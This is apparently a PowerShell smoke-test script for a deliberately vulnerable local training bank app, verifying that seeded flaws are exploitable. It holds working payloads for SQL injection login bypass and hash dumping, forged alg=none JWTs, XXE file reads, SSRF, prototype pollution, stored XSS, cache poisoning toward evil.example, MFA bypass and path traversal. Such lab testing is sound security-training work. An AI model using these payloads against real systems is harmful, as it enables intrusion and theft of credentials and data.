# smoke-test.ps1 - vulnerability checklist against running vuln-bank.
param([string]$Base = 'http://127.0.0.1:3001')

$ErrorActionPreference = 'Continue'
$script:pass = 0
$script:fail = 0

function Check {
    param([string]$Name, [bool]$Cond, [string]$Detail = '')
    if ($Cond) {
        Write-Host ('  [PASS] ' + $Name) -ForegroundColor Green
        $script:pass++
    } else {
        Write-Host ('  [FAIL] ' + $Name + ' ' + $Detail) -ForegroundColor Red
        $script:fail++
    }
}

function NewSession { New-Object Microsoft.PowerShell.Commands.WebRequestSession }

function Hit {
    param(
        [string]$Method = 'GET',
        [string]$Path,
        $Session = $null,
        [hashtable]$Form = $null,
        [string]$RawBody = $null,
        [string]$ContentType = $null,
        [hashtable]$Headers = $null
    )
    $params = @{
        Uri                = ($Base + $Path)
        Method             = $Method
        UseBasicParsing    = $true
        MaximumRedirection = 0
        ErrorAction        = 'SilentlyContinue'
    }
    if ($Session) { $params['WebSession'] = $Session }
    if ($Headers) { $params['Headers'] = $Headers }
    if ($RawBody) {
        $params['Body'] = $RawBody
        if ($ContentType) { $params['ContentType'] = $ContentType }
    } elseif ($Form) {
        $params['Body'] = $Form
    }
    try {
        return Invoke-WebRequest @params
    } catch [System.Net.WebException] {
        return $_.Exception.Response
    } catch {
        return $null
    }
}

function ReadBody($resp) {
    if (-not $resp) { return '' }
    if ($resp.Content) { return [string]$resp.Content }
    try {
        $stream = $resp.GetResponseStream()
        $reader = New-Object IO.StreamReader($stream)
        $text = $reader.ReadToEnd()
        $reader.Close()
        return $text
    } catch { return '' }
}

function StatusOf($resp) {
    if (-not $resp) { return 0 }
    if ($resp.StatusCode -is [int]) { return [int]$resp.StatusCode }
    return [int]$resp.StatusCode.value__
}

function LocationOf($resp) {
    if (-not $resp) { return '' }
    if ($resp.Headers -and $resp.Headers.Location) { return [string]$resp.Headers.Location }
    return ''
}

Write-Host ''
Write-Host '--- 0 Health ---' -ForegroundColor Cyan
$r = Hit -Method GET -Path '/login'
Check 'GET /login returns 200' ((StatusOf $r) -eq 200)

Write-Host ''
Write-Host '--- 1 SQLi login bypass ---' -ForegroundColor Cyan
$sqliSession = NewSession
# MySQL requires whitespace after `--`; use `#` (single-line) which works in both.
$sqliUser = "' OR '1'='1'#"
$r = Hit -Method POST -Path '/login' -Session $sqliSession -Form @{
    username = $sqliUser
    password = 'nope'
    next     = '/accounts'
}
Check 'sqli login redirects 302' ((StatusOf $r) -eq 302)
$r = Hit -Method GET -Path '/accounts' -Session $sqliSession
Check 'sqli session reaches accounts' ((StatusOf $r) -eq 200)

Write-Host ''
Write-Host '--- 2 Real login alice.chen ---' -ForegroundColor Cyan
$alice = NewSession
$r = Hit -Method POST -Path '/login' -Session $alice -Form @{
    username = 'alice.chen'
    password = 'Password123!'
    next     = '/accounts'
}
Check 'alice login redirects' ((StatusOf $r) -eq 302)
$r = Hit -Method GET -Path '/accounts' -Session $alice
Check 'alice accounts page' ((StatusOf $r) -eq 200)

Write-Host ''
Write-Host '--- 3 IDOR /accounts/9 ---' -ForegroundColor Cyan
$r = Hit -Method GET -Path '/accounts/9' -Session $alice
$body = ReadBody $r
Check 'idor returns 200' ((StatusOf $r) -eq 200)
Check 'idor shows other account number' (($body -match '4002-6601-0001') -or ($body -match 'Account'))

Write-Host ''
Write-Host '--- 4 SQLi accounts/search ---' -ForegroundColor Cyan
Add-Type -AssemblyName System.Web
# MySQL: `--` needs trailing whitespace; use `#` which collapses cleanly when URL-encoded.
$q = "x' UNION SELECT username,password_md5,role FROM users#"
$enc = [System.Web.HttpUtility]::UrlEncode($q)
$r = Hit -Method GET -Path ('/accounts/search?q=' + $enc) -Session $alice
$body = ReadBody $r
Check 'search returns 200' ((StatusOf $r) -eq 200)
Check 'search leaks md5 hashes' ($body -match '[a-f0-9]{32}')

Write-Host ''
Write-Host '--- 5 BAC /admin as customer ---' -ForegroundColor Cyan
$r = Hit -Method GET -Path '/admin' -Session $alice
Check 'alice can load /admin' ((StatusOf $r) -eq 200)

Write-Host ''
Write-Host '--- 6 Mass-assignment register role=admin ---' -ForegroundColor Cyan
$evil = NewSession
$evilUser = 'evil_' + (Get-Random -Maximum 999999)
$r = Hit -Method POST -Path '/register' -Session $evil -Form @{
    username  = $evilUser
    password  = 'Pwned1!'
    email     = ($evilUser + '@x.test')
    full_name = 'Evil'
    role      = 'admin'
}
Check 'register evil/admin accepted' (((StatusOf $r) -eq 200) -or ((StatusOf $r) -eq 302))
$r = Hit -Method POST -Path '/login' -Session $evil -Form @{
    username = $evilUser
    password = 'Pwned1!'
    next     = '/admin'
}
Check 'login evil redirects' ((StatusOf $r) -eq 302)
$r = Hit -Method GET -Path '/admin/users' -Session $evil
Check 'evil reaches /admin/users' ((StatusOf $r) -eq 200)

Write-Host ''
Write-Host '--- 7 API login JWT and alg=none ---' -ForegroundColor Cyan
$loginJson = '{"username":"alice.chen","password":"Password123!"}'
$r = Hit -Method POST -Path '/api/login' -RawBody $loginJson -ContentType 'application/json'
Check '/api/login returns 200' ((StatusOf $r) -eq 200)
$tok = $null
try { $tok = (ReadBody $r | ConvertFrom-Json).token } catch {}
Check 'received jwt' ($tok -and $tok.Length -gt 20)
$h = @{ Authorization = ('Bearer ' + $tok) }
$r = Hit -Method GET -Path '/api/me' -Headers $h
Check '/api/me with real token' ((StatusOf $r) -eq 200)
function B64Url([string]$s) {
    $b = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s))
    return $b.TrimEnd('=').Replace('+','-').Replace('/','_')
}
$header  = '{"alg":"none","typ":"JWT"}'
$payload = '{"sub":1,"username":"alice.chen","role":"admin"}'
$noneTok = (B64Url $header) + '.' + (B64Url $payload) + '.'
$h2 = @{ Authorization = ('Bearer ' + $noneTok) }
$r = Hit -Method GET -Path '/api/me' -Headers $h2
Check 'alg=none accepted by /api/me' ((StatusOf $r) -eq 200)

Write-Host ''
Write-Host '--- 8 BOLA /api/users/2 with alice token ---' -ForegroundColor Cyan
$r = Hit -Method GET -Path '/api/users/2' -Headers $h
Check 'bola users/2' ((StatusOf $r) -eq 200)
$body = ReadBody (Hit -Method GET -Path '/api/me' -Headers $h)
Check '/api/me leaks password_md5' ($body -match 'password_md5')

Write-Host ''
Write-Host '--- 9 /api/v1/users no auth ---' -ForegroundColor Cyan
$r = Hit -Method GET -Path '/api/v1/users'
Check '/api/v1/users with no auth' ((StatusOf $r) -eq 200)

Write-Host ''
Write-Host '--- 10 XXE statements/import-xml ---' -ForegroundColor Cyan
# Try Linux first (Docker), then Windows. Either response signature proves XXE.
$xmlLin = "<?xml version=`"1.0`"?>`n<!DOCTYPE r [<!ENTITY xxe SYSTEM `"file:///etc/hostname`">]>`n<r>&xxe;</r>"
$xmlWin = "<?xml version=`"1.0`"?>`n<!DOCTYPE r [<!ENTITY xxe SYSTEM `"file:///C:/Windows/win.ini`">]>`n<r>&xxe;</r>"
$r1 = Hit -Method POST -Path '/statements/import-xml' -Session $alice -RawBody $xmlLin -ContentType 'application/xml'
$body1 = ReadBody $r1
$r2 = Hit -Method POST -Path '/statements/import-xml' -Session $alice -RawBody $xmlWin -ContentType 'application/xml'
$body2 = ReadBody $r2
$leaked = ($body1 -match '[a-z0-9-]{2,}') -and ($body1 -notmatch 'error' -or $body1.Length -gt 5)
$leakedWin = ($body2 -match 'fonts') -or ($body2 -match 'extensions') -or ($body2 -match 'for 16-bit')
Check 'xxe returns 200' (((StatusOf $r1) -eq 200) -or ((StatusOf $r2) -eq 200))
Check 'xxe leaks host file content (linux /etc/hostname or win.ini)' ($leaked -or $leakedWin)

Write-Host ''
Write-Host '--- 11 SSRF statements/import ---' -ForegroundColor Cyan
$r = Hit -Method POST -Path '/statements/import' -Session $alice -Form @{ url = ($Base + '/debug') }
Check 'ssrf to /debug returns 200' ((StatusOf $r) -eq 200)

Write-Host ''
Write-Host '--- 12 Open redirect /go ---' -ForegroundColor Cyan
$r = Hit -Method GET -Path '/go?u=https://evil.example.com/' -Session $alice
$loc = LocationOf $r
Check 'go returns 302' ((StatusOf $r) -eq 302)
Check 'go redirects offsite' ($loc -match 'evil\.example\.com')

Write-Host ''
Write-Host '--- 13 Prototype pollution /profile ---' -ForegroundColor Cyan
$pp = '{"__proto__":{"isAdmin":true,"overdraftLimit":9999999}}'
$r = Hit -Method POST -Path '/profile' -Session $alice -Form @{ settings = $pp }
Check 'profile post accepted' (((StatusOf $r) -eq 200) -or ((StatusOf $r) -eq 302))
$body = ReadBody (Hit -Method GET -Path '/profile/admin-check' -Session $alice)
Check 'admin-check shows isAdmin true' ($body -match '"isAdmin"\s*:\s*true')

Write-Host ''
Write-Host '--- 14 Stored XSS support_messages ---' -ForegroundColor Cyan
$xss = '<img src=x onerror=alert(1)>'
$r = Hit -Method POST -Path '/support/submit' -Session $alice -Form @{
    subject = 'hi'
    body    = $xss
}
Check 'support submit ok' (((StatusOf $r) -eq 200) -or ((StatusOf $r) -eq 302))
$julie = NewSession
$null = Hit -Method POST -Path '/login' -Session $julie -Form @{
    username = 'julie.morgan'
    password = 'Admin2024!'
    next     = '/admin'
}
$body = ReadBody (Hit -Method GET -Path '/admin' -Session $julie)
Check 'admin renders raw onerror payload' ($body -match 'onerror=alert\(1\)')

Write-Host ''
Write-Host '--- 15 CORS reflection w/ credentials ---' -ForegroundColor Cyan
$h3 = @{
    Origin        = 'https://attacker.example'
    Authorization = ('Bearer ' + $tok)
}
$r = Hit -Method GET -Path '/api/me' -Headers $h3
$aco = ''
$acc = ''
if ($r.Headers) {
    if ($r.Headers['Access-Control-Allow-Origin'])       { $aco = [string]$r.Headers['Access-Control-Allow-Origin'] }
    if ($r.Headers['Access-Control-Allow-Credentials'])  { $acc = [string]$r.Headers['Access-Control-Allow-Credentials'] }
}
Check 'Allow-Origin reflects attacker' ($aco -eq 'https://attacker.example')
Check 'Allow-Credentials = true' ($acc -eq 'true')

Write-Host ''
Write-Host '--- 16 /debug exposed ---' -ForegroundColor Cyan
$r = Hit -Method GET -Path '/debug'
$body = ReadBody $r
Check '/debug returns 200' ((StatusOf $r) -eq 200)
Check '/debug leaks env or headers' (($body -match 'env') -or ($body -match 'headers') -or ($body -match 'session'))

Write-Host ''
Write-Host '--- 17 source-map disclosure ---' -ForegroundColor Cyan
$r = Hit -Method GET -Path '/static/js/app.js.map'
$body = ReadBody $r
Check '/app.js.map returns 200' ((StatusOf $r) -eq 200)
Check 'map contains STRIPE_KEY' ($body -match 'STRIPE_KEY')

Write-Host ''
Write-Host '--- 18 X-Forwarded-Host cache poisoning ---' -ForegroundColor Cyan
$h4 = @{ 'X-Forwarded-Host' = 'attacker.example.com' }
$r = Hit -Method GET -Path '/admin' -Session $julie -Headers $h4
$link = ''
if ($r.Headers -and $r.Headers['Link']) { $link = [string]$r.Headers['Link'] }
Check 'Link header reflects attacker host' ($link -match 'attacker\.example\.com')

# Real web-cache poisoning through the misconfigured cache on :8001 (this
# service only runs under `docker compose up`; skip cleanly if it is absent).
$cacheBase = $Base -replace ':3001', ':8001'
$cacheUp = $false
try {
    $null = Invoke-WebRequest -Uri ($cacheBase + '/login') -UseBasicParsing -TimeoutSec 3 -ErrorAction Stop
    $cacheUp = $true
} catch { $cacheUp = ($null -ne $_.Exception.Response) }
if (-not $cacheUp) {
    Write-Host '  [SKIP] :8001 cache not running (docker compose only)' -ForegroundColor DarkGray
} else {
    $poisonUri = $cacheBase + '/admin?smoke=cachepoison'
    $poisonXfh = 'evil.example/x>; rel="preload"; as="script"</bait'
    # 1. Prime the cache from an authenticated session with a poisoned XFH.
    $null = Invoke-WebRequest -Uri $poisonUri -WebSession $julie `
        -Headers @{ 'X-Forwarded-Host' = $poisonXfh } `
        -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue
    # 2. Victim (no session, no XFH) fetches the same path -> served from cache.
    $victim = $null
    try {
        $victim = Invoke-WebRequest -Uri $poisonUri -UseBasicParsing `
            -MaximumRedirection 0 -ErrorAction SilentlyContinue
    } catch { $victim = $_.Exception.Response }
    $xcache = ''; $cLink = ''
    if ($victim -and $victim.Headers) {
        if ($victim.Headers['X-Cache']) { $xcache = [string]$victim.Headers['X-Cache'] }
        if ($victim.Headers['Link'])    { $cLink  = [string]$victim.Headers['Link'] }
    }
    Check ':8001 cache serves the poisoned Link from cache (X-Cache HIT)' `
        (($xcache -match 'HIT') -and ($cLink -match 'evil\.example'))
}

Write-Host ''
Write-Host '--- 19 MFA bypass success=true ---' -ForegroundColor Cyan
# Register a fresh user, log them in, enable MFA via mass-assignment PUT,
# then prove the success=true bypass works — keeps alice's account untouched
# so the test suite is idempotent.
$mfaUser = 'mfa_' + (Get-Random -Maximum 999999)
$reg = NewSession
$null = Hit -Method POST -Path '/register' -Session $reg -Form @{
    username  = $mfaUser
    password  = 'Pwned1!'
    email     = ($mfaUser + '@x.test')
    full_name = 'MFA Test'
    role      = 'customer'
}
$loginJson2 = '{"username":"' + $mfaUser + '","password":"Pwned1!"}'
$r = Hit -Method POST -Path '/api/login' -RawBody $loginJson2 -ContentType 'application/json'
$mfaTok = $null
try { $mfaTok = (ReadBody $r | ConvertFrom-Json).token } catch {}
$mfaUserId = $null
try { $mfaUserId = (ReadBody $r | ConvertFrom-Json).user.id } catch {}
if (-not $mfaUserId) {
    try { $mfaUserId = (ReadBody (Hit -Method GET -Path '/api/me' -Headers @{ Authorization = 'Bearer ' + $mfaTok }) | ConvertFrom-Json).id } catch {}
}
$h5 = @{ Authorization = ('Bearer ' + $mfaTok) }
$null = Hit -Method PUT -Path ('/api/users/' + $mfaUserId) -Headers $h5 -RawBody '{"mfa_enabled":1}' -ContentType 'application/json'
$mfa = NewSession
$r = Hit -Method POST -Path '/login' -Session $mfa -Form @{
    username = $mfaUser
    password = 'Pwned1!'
    next     = '/accounts'
}
$loc = LocationOf $r
Check 'login w/ mfa redirects to /mfa' (($loc -match '/mfa') -or ((StatusOf $r) -eq 302))
$r = Hit -Method POST -Path '/mfa/verify' -Session $mfa -Form @{
    success = 'true'
    next    = '/accounts'
}
Check 'mfa bypass returns 302' ((StatusOf $r) -eq 302)
$r = Hit -Method GET -Path '/accounts' -Session $mfa
Check 'authenticated after bypass' ((StatusOf $r) -eq 200)

Write-Host ''
Write-Host '--- 20 path traversal statements/file ---' -ForegroundColor Cyan
$r = Hit -Method GET -Path '/statements/file?name=../../seed.js' -Session $alice
$body = ReadBody $r
Check 'seed.js leaked via traversal' (((StatusOf $r) -eq 200) -and ($body -match 'resetting vuln-bank schema'))

Write-Host ''
Write-Host '=================================================' -ForegroundColor Yellow
Write-Host (' Smoke test: ' + $script:pass + ' passed, ' + $script:fail + ' failed') -ForegroundColor Yellow
Write-Host '=================================================' -ForegroundColor Yellow
exit $script:fail
